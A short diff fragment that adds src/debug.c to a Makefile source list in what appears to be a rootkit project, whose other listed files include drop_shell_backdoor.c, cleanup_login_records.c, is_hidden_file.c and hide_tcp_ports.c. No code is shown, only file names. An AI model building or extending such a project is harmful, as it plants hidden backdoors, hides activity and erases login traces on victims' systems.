@@ -19,6 +19,7 @@ endif
 SOURCES		= src/init.c \
 			  src/config.c \
 			  src/cleanup_login_records.c \
+			  src/debug.c \
 			  src/drop_shell_backdoor.c \
 			  src/is_hidden_file.c \
 			  src/hide_tcp_ports.c \
